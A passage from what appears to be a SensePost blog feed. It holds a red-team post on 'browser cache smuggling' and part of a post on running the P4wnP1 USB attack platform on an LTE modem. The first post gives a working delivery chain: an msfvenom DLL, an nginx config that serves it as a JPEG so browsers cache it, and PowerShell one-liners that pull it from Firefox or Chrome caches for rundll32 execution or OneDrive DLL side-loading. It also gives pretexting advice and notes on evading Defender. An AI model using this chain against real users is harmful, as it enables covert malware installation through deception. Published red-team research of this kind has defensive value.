point I thought it was impossible to weaponize this technique for Chrome until @shifttymike sent me this message:</p>\n\n\n\n<figure class=\"wp-block-image size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-10.png\"><img loading=\"lazy\" decoding=\"async\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-10.png\" alt=\"\" class=\"wp-image-70513\" style=\"width:610px;height:107px\" width=\"610\" height=\"107\"></a></figure>\n\n\n\n<p>And that is brilliant! Here is how I put up things together. First we create the DLL via msfvenom:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f dll &gt; calc.dll</code></pre>\n\n\n\n<p>Then we preprend a string that is going to tell us where the DLL starts:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>sed -i &quot;1s/^/INDLL/&quot; calc.dll</code></pre>\n\n\n\n<p>And append a string to tell us where it ends:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>echo -n &quot;OUTDLL&quot; &gt;&gt; calc.dll</code></pre>\n\n\n\n<p>At this point we know that our DLL is located between the INDLL and OUTDLL tags in one of Chrome&#x2019;s cache database , all we need to do is to run some PowerShell code that will be able to analyze the Chrome&#x2019;s databases and extract the DLL from them. This can be done via the following PowerShell oneliner:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>$d=&quot;$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data\\&quot;;gci $d|%{if([regex]::Matches([System.Text.Encoding]::Default.GetString([System.IO.File]::ReadAllBytes($_.FullName)),&quot;(?&lt;=INDLL)(.*?)(?=OUTDLL)&quot;,[System.Text.RegularExpressions.RegexOptions]::Singleline).Count-ne0){[System.IO.File]::WriteAllBytes(&quot;$d\\hello.dll&quot;,[System.Text.Encoding]::Default.GetBytes($matches[0].Value))}}</code></pre>\n\n\n\n<p>And effectively, our DLL is found and extracted: </p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-11.png\"><img loading=\"lazy\" decoding=\"async\" width=\"920\" height=\"293\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/image-11.png\" alt=\"\" class=\"wp-image-70515\"></a></figure>\n\n\n\n<p>Then we can use <code>rundll32</code> to execute it:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/rundll_exec.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1021\" height=\"656\" src=\"https://sensepost.com/img/pages/blog/2023/browsers-cache-smuggling/rundll_exec.png\" alt=\"\" class=\"wp-image-70542\"></a></figure>\n\n\n\n<p>Or move the DLL to a specific folder as seen previously.</p>\n\n\n\n<h2 class=\"wp-block-heading\">V/ Conclusion</h2>\n\n\n\n<p>As far as I know, I haven&#x2019;t seen this malware delivery method described yet. To me it&#x2019;s a pretty cool trick since it will allow a red team operator to force the download of malware just by sending a URL to its target. There is no need to trick the target into downloading a malicious file (which could be suspicious), the only thing you have got to take care of is to trick the user into running a benign looking Power Shell one liner. Way stealthier in my opinion ;)!</p>\n\n\n\n<p>Last red teamer tip: If you ever find a computer or server on which a browser is installed, you can take a look at the cache folder and read the cached files. Thanks to the metadata you will be able to gather DNS hostnames that will allow you to discover potential targets on the internal network (hey there vSphere :D)!</p>\n\n\n\n<p>Happy hacking!</p>\n\n\n\n<p>This is a cross-post from <a href=\"https://blog.whiteflag.io/blog/browser-cache-smuggling/\" target=\"_blank\" rel=\"noreferrer noopener\">https://blog.whiteflag.io/blog/browser-cache-smuggling/</a></p>\n",
      "content:encodedSnippet": "On red team engagements, I often use social engineering to get one of my client’s employees to run my malicious code on their machines, allowing me to get access to their system. A typical approach I’ve used is to call them up, tell them I’m from IT support, and then get them to go to an official looking web page that contains some PowerShell code they need to run, to fix some made-up problem.\nHowever, this approach is well known to security vendors, and these days almost all anti-malware and EDR products will block or at least alert on any suspicious looking PowerShell code, especially code that downloads a payload and then executes it. I wanted to find another, stealthier way to deliver a payload to targeted users.\nSo, the first question I asked myself is what mechanisms are used by an operating system on a daily basis that I could manipulate in order to deliver malware? And then it popped into my head: browser cache!\nIn this blog post I’ll present a technique in which an attacker social engineers a target employee to visit a web site. The web site will then silently place a DLL payload in the browser’s cache, disguised as an image. On the same web site, the user is socially engineered to run a benign looking PowerShell one liner that moves the DLL payload to a folder, where it will be automatically executed. I’ll also show some other interesting things I found regarding Defender while doing this research.\nI/ What is browser cache?\nWhen you navigate on the Internet, your browser loads a ton of files such as images, videos, CSS, JavaScript and so on. Loading the same page twice means that the browser will download the same files twice. That’s useless and it takes a lot of CPU resources as well as network bandwidth.\nModern browsers implement a mechanism that allows them to store these files locally so that they don’t need to download them every time. This mechanism is called the browser cache.\nIf we look at how Firefox on Windows works, we see that there is a Firefox directory in AppData/Local, that stores what looks like cached files:\n\nAnd there are quite a few files, around 300MB:\n\nNow let’s purge this directory and navigate to the https://orangecyberdefense.com website. You will see that new files are added while we navigate:\n\nSo, it seems we have found a mechanism that automatically downloads files!\nHowever, browsers will not cache just any file provided by a server. It will cache static resources – files whose content is not going to change often. As such, our browsers will mostly cache images, videos and sometimes JS/CSS. It would be great if we could somehow trick a browser into caching files that contain a binary payload, such as a DLL or EXE file. How do we do that?\nII/ Manipulating browsers’ cache mechanisms\nTo detect which files to cache, browsers will mainly rely on the Content-Type header that is sent by the web server. For example, in the screenshot below we can see that the file “avatar.jpg” was sent by the server and its content type is “image/jpeg”:\n\nOn Linux, web servers typically use the /etc/mime.types file, to know which content type it should return for a specific file. The content of /etc/mime.types typically looks like this:\n\nThis file contains the content-type values linked to the extension of the files. As such, when the webserver (Nginx in this case) sees that the file avatar.jpg is requested, it will check in the mime.types file to determine what is the content-type of the .jpg extension, and see that it is image/jpeg:\nAs an attacker, we can override these values. Remember, our goal is to force the download of either a DLL or an EXE file. To do so, we’ll simply have to change the content type related to the DLL and EXE files from application/x-msdos-program to image/jpeg. This is simply done with the following line in your Nginx configuration:\ntypes { } default_type image/jpeg;\nThis nullifies the in-memory mime type mapping, and then sets the default content type to “image/jpg” for unknown types (i.e. all files, since we nuked the mappings first). Enclosing this in a “location” block which only matches your payload(s) will achieve the desired effect without turning everything into an “image”. See part III below for the complete config in context.\nNext, we will have to generate two things:\nA DLL, in this case a simple one that will run calc.exe generated via MSFVenom:\nmsfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f dll > calc.dll\nAn HTML page in which the DLL is embedded in a img tag:\n<!DOCTYPE html>\n<html>\n        <body>\n                <h1>Browser cache smuggling</h1>\n                <img src=\"calc.dll\" style=\"display: none;\"></img>\n        </body>\n</html>\nWe then empty Firefox’s cache, reload the HTML page and see that the file was downloaded:\n\n\n\n\nConsidering the size of the cached files we can conclude that the file starting with 75E… Is our calc DLL. To be sure, we can load the following page on Firefox:\nabout:cache?storage=disk\nThat is listing all the cached files on Firefox. And if we do a string lookup, we’ll see that the calc.dll was cached:\n\nWhich means that the DLL was effectively delivered to the system. And what if I told you that this delivery method is not flagged by anti-virus? Yup! Defender is running on the Windows machine that is my target and it’s not yelling anything. Know why? Because when the DLL was downloaded and stored in the cache, it was renamed to a random filename without an extension:\n\nAs such, Defender is not scanning the file and our DLL can stay there for as long as we need!\nIII/ What about execution ?\nA typical way to get this working is to social engineer a user, telling them there is something wrong with their system, and that they need to run a command to fix it. We tell them that the command is on an official looking web page. When the page loads, the DLL gets cached onto their system. The user gets the command from the web page, and runs it, which causes the already cached DLL to be executed. With this approach, we ensure that the DLL is still cached when the user runs the command.\nThe key differentiator between this approach, and social engineering a user to run a C2 stager command, is that the command we get the user to run doesn’t download a malicious payload, as its already on the system, cached by the browser. The idea is to try and make the command as benign looking as possible, to avoid suspicion or detection, and let Firefox do the dirty work by caching the malware DLL file.\nTo make this work, we need a way to find our DLL between all the other files that are cached by the browser.\nIf we take a closer look at the size of the cached DLL and the size of the DLL itself, we will see that the cached one is slightly bigger:\n\nThe reason is that the cached file is not just the DLL, it’s a file that contains both the DLL file’s content as well as metadata. Amongst the metadata, there is the HTTP response of the Nginx server, containing a few HTTP headers:\n\nAs such, all we need to do is to create a flag in the HTTP response of the server that will allow us to identify our DLL. We can accomplish this by modifying the Nginx configuration file in the following way:\nserver {\n\tlisten 80 default_server;\n\tlisten [::]:80 default_server;\n\troot /var/www/html;\n\tindex index.html index.htm index.nginx-debian.html;\n\tserver_name _;\n\n\t# Adding the HTTP header TAG used to find the real DLL\n\tlocation /calc.dll {\n\t\t# Override the mime type\n\t\ttypes { } default_type image/jpeg;\n\t\tadd_header Tag DLLHERE;\n\t}\n}\nIf we reload the HTML page, we see that when the server is requested to provide the calc.dll file, its response contains an additional HTTP header that marks our DLL:\n\nUsing PowerShell or batch we can search for this specific string to find our DLL in the local cache directory:\n\nAt this point we know where our DLL is, so let’s try executing it.\nWhile doing this research I realized that as soon as I renamed the cache file to “calc.dll”, the anti-virus flagged it as being malicious (msfvenom you know…). I tried a lot of things until I realized that rundll32 can execute a DLL that hasn’t got the .dll extension:\n\nAll you need to do is to append a dot to the cached filename and rundll32 will execute it. Even stranger, we saw before that the cached file is not just the DLL but also metadata, yet rundll32 doesn’t care about that and will execute the DLL.\nGetting a user to execute rundll32 may set off some alarms, even if the DLL is already on the user’s file system. An alternative approach may be simply to move the existing DLL into place, so that it gets executed when the user opens another application. This results in a far more benign command, that doesn’t download or execute anything itself, it only moves an existing file. However, this approach does require that your malicious DLL doesn’t get statically detected by AV.\nThe following PowerShell one liner will look for the DLL in the cache directory and move it to an appropriate place, such as the OneDrive folder in order to launch a DLL side loading attack:\nforeach($f in @(\"$env:LOCALAPPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cache2\\entries\\\")){gci $f -r|%{if(Select-String -Pattern \"DLLHERE\" -Path $_.FullName){cp $_.FullName $env:LOCALAPPDATA\\Microsoft\\OneDrive\\CRYPTBASE.dll}}}\nNext time OneDrive is launched, your malware will be too! \nIV/ What about Google Chrome ?\nThe way Google Chrome stores files in its cache is a little more complicated to exploit. Indeed, files are not stored individually, they are stored in multiple databases located in the %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data folder:\n\n\n\n\nAs such, retrieving cached files means manipulating the database and this is not easy, especially with PowerShell. At this point I thought it was impossible to weaponize this technique for Chrome until @shifttymike sent me this message:\n\n\n\n\nAnd that is brilliant! Here is how I put up things together. First we create the DLL via msfvenom:\nmsfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f dll > calc.dll\nThen we preprend a string that is going to tell us where the DLL starts:\nsed -i \"1s/^/INDLL/\" calc.dll\nAnd append a string to tell us where it ends:\necho -n \"OUTDLL\" >> calc.dll\nAt this point we know that our DLL is located between the INDLL and OUTDLL tags in one of Chrome’s cache database , all we need to do is to run some PowerShell code that will be able to analyze the Chrome’s databases and extract the DLL from them. This can be done via the following PowerShell oneliner:\n$d=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache\\Cache_Data\\\";gci $d|%{if([regex]::Matches([System.Text.Encoding]::Default.GetString([System.IO.File]::ReadAllBytes($_.FullName)),\"(?<=INDLL)(.*?)(?=OUTDLL)\",[System.Text.RegularExpressions.RegexOptions]::Singleline).Count-ne0){[System.IO.File]::WriteAllBytes(\"$d\\hello.dll\",[System.Text.Encoding]::Default.GetBytes($matches[0].Value))}}\nAnd effectively, our DLL is found and extracted: \n\n\n\n\nThen we can use rundll32 to execute it:\n\n\n\n\nOr move the DLL to a specific folder as seen previously.\nV/ Conclusion\nAs far as I know, I haven’t seen this malware delivery method described yet. To me it’s a pretty cool trick since it will allow a red team operator to force the download of malware just by sending a URL to its target. There is no need to trick the target into downloading a malicious file (which could be suspicious), the only thing you have got to take care of is to trick the user into running a benign looking Power Shell one liner. Way stealthier in my opinion ;)!\nLast red teamer tip: If you ever find a computer or server on which a browser is installed, you can take a look at the cache folder and read the cached files. Thanks to the metadata you will be able to gather DNS hostnames that will allow you to discover potential targets on the internal network (hey there vSphere :D)!\nHappy hacking!\nThis is a cross-post from https://blog.whiteflag.io/blog/browser-cache-smuggling/",
      "content": "On red team engagements, I often use social engineering to get one of my client&amp;#x2019;s employees to run my malicious code on their machines, allowing me to get access to their system. A typical approach I&amp;#x2019;ve used is to call them up, tell them I&amp;#x2019;m from IT support, and then get them to go to an official looking web page that contains some PowerShell code they need to run, to fix some made-up problem.\n\n",
      "contentSnippet": "On red team engagements, I often use social engineering to get one of my client&#x2019;s employees to run my malicious code on their machines, allowing me to get access to their system. A typical approach I&#x2019;ve used is to call them up, tell them I&#x2019;m from IT support, and then get them to go to an official looking web page that contains some PowerShell code they need to run, to fix some made-up problem.",
      "guid": "https://sensepost.com/blog/2023/browsers-cache-smuggling/",
      "isoDate": "2023-07-10T08:33:20.000Z",
      "itunes": {}
    },
    {
      "title": "P4wnP1-LTE",
      "link": "https://sensepost.com/blog/2023/p4wnp1-lte/",
      "pubDate": "Sun, 09 Jul 2023 18:06:49 +0000",
      "content:encoded": "<p>I&#x2019;ve written a couple of blog posts in the past in which I explain how to use Marcus Mengs&#x2019; truly excellent <a href=\"https://github.com/RoganDawes/P4wnP1_aloa\" data-type=\"URL\" data-id=\"https://github.com/RoganDawes/P4wnP1_aloa\" target=\"_blank\" rel=\"noreferrer noopener\">P4wnP1</a>. The most common deployment scenario involves a Raspberry Pi Zero W, or possibly a <a rel=\"noreferrer noopener\" href=\"https://sensepost.com/blog/2020/making-the-perfect-red-team-dropbox-part-1/\" data-type=\"URL\" data-id=\"https://sensepost.com/blog/2020/making-the-perfect-red-team-dropbox-part-1/\" target=\"_blank\">FriendlyArm NanoPi R1S</a>. The downside of these platforms is that you need to be in fairly close physical proximity in order to access the WiFi interface, or even closer to access Bluetooth. The NanoPi R1S can support an LTE modem, to give you much bigger range, but the downside to that is that it looks pretty clunky.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/p4wnp1-lte/r1s_with_modem.png\"><img loading=\"lazy\" decoding=\"async\" width=\"941\" height=\"553\" src=\"https://sensepost.com/img/pages/blog/2023/p4wnp1-lte/r1s_with_modem.png\" alt=\"\" class=\"wp-image-67824\"></a></figure>\n\n\n\n<p>In this post, I&#x2019;m going to show you how to install and use P4wnP1 on the LTE modem itself, skipping the NanoPi R1S completely.</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/p4wnp1-lte/LTE_Modem2.png\"><img loading=\"lazy\" decoding=\"async\" width=\"856\" height=\"254\" src=\"https://sensepost.com/img/pages/blog/2023/p4wnp1-lte/LTE_Modem2.png\" alt=\"\" class=\"wp-image-67768\"></a></figure>\n\n\n\n<p>Wait, what!? Is this a trick? How on earth can you install software on an LTE modem? Good question!</p>\n\n\n\n<p>About six years ago, the Osmocom folks posted about how <a rel=\"noreferrer noopener\" href=\"https://osmocom.org/projects/quectel-modems\" data-type=\"URL\" data-id=\"https://osmocom.org/projects/quectel-modems\" target=\"_blank\">some Qualcomm modems are actually just running Linux under the hood</a>. There are a bunch of modems that fall into this category, which you can find <a rel=\"noreferrer noopener\" href=\"https://osmocom.org/projects/quectel-modems/wiki/Standalone_modems\" data-type=\"URL\" data-id=\"https://osmocom.org/projects/quectel-modems/wiki/Standalone_modems\" target=\"_blank\">here</a>. Having just created <a rel=\"noreferrer noopener\" href=\"https://www.sensepost.com/blog/2016/universal-serial-abuse/\" data-type=\"URL\" data-id=\"https://www.sensepost.com/blog/2016/universal-serial-abuse/\" target=\"_blank\">USaBUSe</a>, I immediately saw the potential for running USaBUSE on such a platform &#x2013; it had the USB gadget capability, and a long range network interface. Just PERFECT! I immediately purchased a DLink DWM222 modem, which is on that list. But it languished, as I was unable to get it to the ADB shell immediately, and then other projects came along pushing it down the stack.</p>\n\n\n\n<p>Then last year, Hackaday posted <a rel=\"noreferrer noopener\" href=\"https://hackaday.com/2022/08/03/hackable-20-modem-combines-lte-and-pi-zero-w2-power/\" data-type=\"URL\" data-id=\"https://hackaday.com/2022/08/03/hackable-20-modem-combines-lte-and-pi-zero-w2-power/\" target=\"_blank\">this</a> article, about how a hacker named HandsomeYingyan had figured out that a particular LTE modem was running Linux, and was able to build his own distribution for it. His github repo was in Chinese, and another hacker named extrowerk had gone to the trouble of running it through Google Translate, and making notes on how to actually use it for the rest of us.  Seeing this, I immediately went searching for a suitable vendor on AliExpress, and added one to my shopping cart. But personal hacking budgets intervened (I&#x2019;ve never been good at asking SensePost to pay for my toys, but I am getting better &#x2013; I submitted this claim at least!), and it languished there until about two months ago when I finally pulled the trigger. Two months later, thanks to the vagaries of the South African Post Office, it finally arrived.</p>\n\n\n\n<p>Having opened it up, I found it labeled as &#x201C;FY_UZ801_V3.2&#x201D;, which appeared to be a newer revision of one of the &#x201C;known-working&#x201D; variants. Good news! It&#x2019;s actually quite a capable little device. Quad core, 512MB RAM, 4GB flash, WiFi and Bluetooth (Bluetooth not yet working), and of course, USB gadget enabled with an LTE interface. Just check that the GSM frequency bands on the modem you choose match up to what is available in your area.</p>\n\n\n\n<p>I lost no time in following <a rel=\"noreferrer noopener\" href=\"https://extrowerk.com/2022/07/31/OpenStick/\" data-type=\"URL\" data-id=\"https://extrowerk.com/2022/07/31/OpenStick/\" target=\"_blank\">extrowerk&#x2019;s instructions,</a> and soon had Debian installed and running successfully on my modem! Whoop! Note: When flashing the &#x201C;base&#x201D; files, you want to be in the <code>base/</code> directory, and run <code>./flash.sh</code>, rather than <code>base/flash.sh</code>, as many of the required files are not found otherwise. Note2: Be smarter than me, and take a backup of the modem&#x2019;s firmware using <a rel=\"noreferrer noopener\" href=\"https://hackaday.com/2022/08/03/hackable-20-modem-combines-lte-and-pi-zero-w2-power/#comment-6509055\" data-type=\"URL\" data-id=\"https://hackaday.com/2022/08/03/hackable-20-modem-combines-lte-and-pi-zero-w2-power/#comment-6509055\" target=\"_blank\">this</a> comment&#x2019;s advice, before gaily wiping everything out!</p>\n\n\n\n<p>I was soon logged on using <code>adb shell</code>, and exploring the new playground I found myself in. First things first, let&#x2019;s get it online using the WiFi interface. After setting your <code>TERM</code> variable to something suitable like <code>TERM=xterm</code>, you can run <code>nmtui</code> and select your AP.</p>\n\n\n\n<p>It is a very limited installation of Debian, many necessities you would expect are not installed, such as <code>vi</code>. (OK, or nano!) But the <code>/etc/apt/sources.list</code> contains references to some Chinese mirrors that were not responding when I tried to run <code>apt update</code>. Without an editor, how are you supposed to fix this? My approach was the following:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>cat &gt; /etc/apt/sources.list &lt;&lt;EOF\ndeb http://deb.debian.org/debian bullseye main contrib non-free\ndeb-src http://deb.debian.org/debian bullseye main contrib non-free\n\ndeb http://deb.debian.org/debian bullseye-updates main contrib non-free\ndeb-src http://deb.debian.org/debian bullseye-updates main contrib non-free\n\ndeb http://deb.debian.org/debian bullseye-backports main contrib non-free\ndeb-src http://deb.debian.org/debian bullseye-backports main contrib non-free\n\ndeb http://security.debian.org/debian-security/ bullseye-security main contrib non-free\ndeb-src http://security.debian.org/debian-security/ bullseye-security main contrib non-free\nEOF</code></pre>\n\n\n\n<p>Now you can run <code>apt update</code> and install your preferred editor and other niceties.</p>\n\n\n\n<p>One of my first priorities was to get the LTE interface working, as this was the whole point of the device. And this is where my struggles began &#x2026;</p>\n\n\n\n<p>After way too much frustration wondering why the modem was reporting &#x201C;NotReady&#x201D;, I realised that I probably had the wrong firmware loaded for the LTE peripheral. And in my haste to get Debian installed, I had merrily blown away the entire firmware for the entire modem, including that for the LTE peripheral! </p>\n\n\n\n<p>Note: There are two things that could quite reasonably be called an &#x201C;LTE modem&#x201D;. One is the entire device, with a USB connector sticking out of it. The other is the actual LTE peripheral. Both of these have firmware which is required to make them functional. One is a Linux operating system, and the other is a program for the Hexagon Digital Signal Processor chip. The LTE peripheral&#x2019;s firmware just happens to be a file in the &#x201C;entire device&#x201D; firmware. So I&#x2019;ll call it the LTE peripheral firmware, clumsy as it is.</p>\n\n\n\n<p>Fortunately, I then found <a rel=\"noreferrer noopener\" href=\"https://zebra.ddscentral.org/pub/downloads/openstick/firmware/uz801_v30/\" data-type=\"URL\" data-id=\"https://zebra.ddscentral.org/pub/downloads/openstick/firmware/uz801_v30/\" target=\"_blank\">another person ddscentral</a> who had built their own version of the kernel, but had also made the LTE peripheral firmware available to download.</p>\n\n\n\n<p>ddscentral even hacked the bootloader to enter fastboot mode when the reset button is pressed while applying power. This means that you can&#x2019;t brick the device by making the Linux distribution unbootable, which would prevent you from successfully invoking <code>adb bootloader</code>. If it won&#x2019;t boot, just hold the button while plugging it in to the host, and it will show up in <code>fastboot devices</code>. Magic! Just follow the instructions at the link above, and all should be good. With that done, I was able to get an LTE peripheral that recognised the modem, and my Vodacom SIM card, but I was still unable to get online.</p>\n\n\n\n<p>After a lot of hair pulling, I finally figured out that there are some built-in profiles in the LTE peripheral firmware that do not have the correct APN set. Running <code>qmicli -d /dev/wwan0qmi0 -p --wds-get-profile-list=3gpp</code> showed 3 profiles, two with an empty APN, and one with <code>&quot;m2m&quot;</code>. None of which will work for Vodacom in South Africa. I made sure that the APN setting in the NetworkManager interface definition was correctly set to <code>&quot;internet&quot;</code>, but that still did not work. After much going around, I discovered that the following script run at startup would do the trick.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>#!/bin/sh\n\n# wait for the modem to enumerate to the host OS\nwhile [ ! -e /dev/wwan0qmi0 ] ; do\n\tsleep 5\ndone\n\nfor i in 1 2 3 ; do\n\t/usr/bin/qmicli -d /dev/wwan0qmi0 -p --wds-modify-profile=&quot;3gpp,$i,apn=internet,pdp-type=ipv4v6&quot;\ndone 2&gt;&amp;1 | tee /tmp/qmicli.log</code></pre>\n\n\n\n<p>This was run in the background from <code>/etc/rc.local</code>, after enabling the <code>rc-local</code> systemd unit, and creating <code>/etc/rc.local</code> as an executable shell script.</p>\n\n\n\n<p>Finally! I could now disable the WiFi interface, and connect purely over the LTE interface. Except &#x2026; many mobile service providers use Carrier Grade NAT, making it impossible to establish inbound connections to mobile devices on their network. And even for those that don&#x2019;t, how do you find it in the first place? Well, the second can be addressed using Dynamic DNS, but the first? I decided to create a Wireguard VPN to a convenient jump box. I&#x2019;ll skip the instructions for that, as I simply followed a tutorial that I found online anyway. Just remember to add the <code>PersistentKeepalive</code> parameter so that it will establish the connection immediately, and not just when some process on the device tries to connect to another VPN endpoint.</p>\n\n\n\n<p>Now I can get to my device using something similar to the following SSH config entry:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>Host openstick-jumpbox\n        User root\n        ProxyJump jumpbox\n        Hostname 192.168.167.117\n        LocalForward 18000 localhost:8000</code></pre>\n\n\n\n<p>The need for the <code>LocalForward</code> will become clear in due course.</p>\n\n\n\n<p>Sweet! Finally, we can start getting P4wnP1 installed. The easiest way is to simply clone the P4wnP1_aloa repo, and then copy the files to the right place. There are also a few dependencies required by P4wnP1, that are not installed by default.</p>\n\n\n\n<pre class=\"wp-block-code\"><code>apt install hostapd iproute2 iw hostapd git\ngit clone https://github.com/RoganDawes/P4wnP1_aloa\ncd P4wnP1_aloa\nmkdir -p /usr/local/P4wnP1\ncp build/P4wnP1_* /usr/local/bin/\ncp -r dist/* /usr/local/P4wnP1/\ncp build/webapp* /usr/local/P4wnP1/www\nmv /usr/local/P4wnP1/P4wnP1.service /etc/systemd/system/</code></pre>\n\n\n\n<p>Now P4wnP1 should be ready to run, but there is another wrinkle to deal with first. Up until now, we have been able to get into the modem by using <code>adb shell</code> from the PC that the modem is plugged into. This is managed by the <code>mobian-usb-gadget</code> systemd unit. But that is also using the USB interface, so we first have to stop/disable that, before P4wnP1 can take it over. Just be aware that from this point, your emergency access path is going away, so if you manage to lock yourself out (e.g. the LTE interface doesn&#x2019;t come up for whatever reason), you might have to re-install it from scratch! There are pads on the PCB for a serial console which may provide an alternative access route, but I have not investigated those yet. They ARE documented, at least. Also be aware that while the device might already have a WiFi network interface defined, P4wnP1 will try to reconfigure it according to its own configuration settings, and so far, I have not been able to get this working. So don&#x2019;t count on the WiFi when P4wnP1 is running.</p>\n\n\n\n<p>I have used the mac80211_hwsim in the past on the NanoPi R1S to add fake WLAN interfaces, so that P4wnP1 will leave the real interface alone, but the kernel module has not been compiled in the images provided. I&#x2019;m looking into building my own images, and will definitely include it when I do.</p>\n\n\n\n<p>All that said, you can stop the adb interface and start P4wnP1 as follows:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>systemctl stop mobian-usb-gadget\nsystemctl start P4wnP1.service</code></pre>\n\n\n\n<p>Note that I didn&#x2019;t <code>enable</code> the P4wnP1 service, or <code>disable</code> the mobian one just yet, allowing a simple reboot to re-activate the ADB daemon.</p>\n\n\n\n<p>Check that P4wnP1 is running successfully using <code>journalctl -xfu P4wnP1</code>. If it complains, I might have missed some of its dependencies in my commands above.</p>\n\n\n\n<p>Now, if you are connected to your device using the SSH config snippet suggested above, the <code>LocalForward</code> should allow you to open your browser to <code>http://localhost:18000</code>, and access the P4wnP1 control interface. NB! P4wnP1 will listen on all interfaces by default, and there is no authentication! This is ok when the interfaces are all connected to trusted networks, and the WiFi passphrase is changed to a strong unique value, etc, etc. It&#x2019;s a slightly different story when one of the interfaces is an LTE one, possibly exposed to the broader internet. I&#x2019;d suggest using an iptables/nftables rule to prevent access to port 50051 and port 8000, or else editing <a rel=\"noreferrer noopener\" href=\"https://github.com/RoganDawes/P4wnP1_aloa/blob/master/service/service.go#L185\" data-type=\"URL\" data-id=\"https://github.com/RoganDawes/P4wnP1_aloa/blob/master/service/service.go#L185\" target=\"_blank\">the source</a> and changing &#x201C;0.0.0.0&#x201D; to &#x201C;127.0.0.1&#x201D; and rebuilding. Now you can do all the P4wnP1 things you could do on any other platform, just from much farther away.</p>\n\n\n\n<p>One thing to be aware of is that the thermal design of this hardware is not fantastic, and it may overheat if pushed too hard. The devices ship with firmware that only uses two of the four available cores as a result, but the replacement kernels are not restricted in this way. If you experience your device overheating, or becoming unstable, you can disable cores with <code>chcpu -d 2,3</code> to disable cores 2 and 3. In theory, Linux kernel thermal management should prevent overheating, but I have not tested this at all.</p>\n",
      "content:encodedSnippet": "I’ve written a couple of blog posts in the past in which I explain how to use Marcus Mengs’ truly excellent P4wnP1. The most common deployment scenario involves a Raspberry Pi Zero W, or possibly a FriendlyArm NanoPi R1S. The downside of these platforms is that you need to be in fairly close physical proximity in order to access the WiFi interface, or even closer to access Bluetooth. The NanoPi R1S can support an LTE modem, to give you much bigger range, but the downside to that is that it looks pretty clunky.\n\n\n\n\nIn this post, I’m going to show you how to install and use P4wnP1 on the LTE modem itself, skipping the NanoPi R1S completely.\n\n\n\n\nWait, what!? Is this a trick? How on earth can you install software on an LTE modem? Good question!\nAbout six years ago, the Osmocom folks posted about how some Qualcomm modems are actually just running Linux under the hood. There are a bunch of modems that fall into this category, which you can find here. Having just created USaBUSe, I immediately saw the potential for running USaBUSE on such a platform – it had the USB gadget capability, and a long range network interface. Just PERFECT! I immediately purchased a DLink DWM222 modem, which is on that list. But it languished, as I was unable to get it to the ADB shell immediately, and then other projects came along pushing it down the stack.\nThen last year, Hackaday posted this article, about how a hacker named HandsomeYingyan had figured out that a particular LTE modem was running Linux, and was able to build his own distribution for it. His github repo was in Chinese, and another hacker named extrowerk had gone to the trouble of running it through Google Translate, and making notes on how to actually use it for the rest of us.  Seeing this, I immediately went searching for a suitable vendor on AliExpress, and added one to my shopping cart. But personal hacking budgets intervened (I’ve never been good at asking SensePost to pay for my toys, but I am getting better – I submitted this claim at least!), and it languished there until about two months ago when I finally pulled the trigger. Two months later, thanks to the vagaries of the South African Post Office, it finally arrived.\nHaving opened it up, I found it labeled as “FY_UZ801_V3.2”, which appeared to be a newer revision of one of the “known-working” variants. Good news! It’s actually quite a capable little device. Quad core, 512MB RAM, 4GB flash, WiFi and Bluetooth (Bluetooth not yet working), and of course, USB gadget enabled with an LTE interface. Just check that the GSM frequency bands on the modem you choose match up to what is available in your area.\nI lost no time in following extrowerk’s instructions, and soon had Debian installed and running successfully on my modem! Whoop! Note: When flashing the “base” files, you want to be in the base/ directory, and run ./flash.sh, rather than base/flash.sh, as many of the required files are not found otherwise. Note2: Be smarter than me, and take a backup of the modem’s firmware using this comment’s advice, before gaily wiping everything out!\nI was soon logged on using adb shell, and exploring the new playground I found myself in. First things first, let’s get it online using the WiFi interface. After setting your TERM variable to something suitable like TERM=xterm, you can run nmtui and select your AP.\nIt is a very limited installation of Debian, many necessities you would expect are not installed, such as vi. (OK, or nano!) But the /etc/apt/sources.list contains references to some Chinese mirrors that were not responding when I tried to run apt update. Without an editor, how are you supposed to fix this? My approach was the following:\ncat > /etc/apt/sources.list <<EOF\ndeb http://deb.debian.org/debian bullseye main contrib non-free\ndeb-src http://deb.debian.org/debian bullseye main contrib non-free\n\ndeb http://deb.debian.org/debian bullseye-updates main contrib non-free\ndeb-src http://deb.debian.org/debian bullseye-updates main contrib non-free\n\ndeb http://deb.debian.org/debian bullseye-backports main contrib non-free\ndeb-src http://deb.debian.org/debian bullseye-backports main contrib non-free\n\ndeb http://security.debian.org/debian-security/ bullseye-security main contrib non-free\ndeb-src http://security.debian.org/debian-security/ bullseye-security main contrib non-free\nEOF\nNow you can run apt update and install your preferred editor and other niceties.\nOne of my first priorities was to get the LTE interface working, as this was the whole point of the device. And this is where my struggles began …\nAfter way too much frustration wondering why the modem was reporting “NotReady”, I realised that I probably had the wrong firmware loaded for the LTE peripheral. And in my haste to get Debian installed, I had merrily blown away the entire firmware for the entire modem, including that for the LTE peripheral! \nNote: There are two things that could quite reasonably be called an “LTE modem”. One is the entire device, with a USB 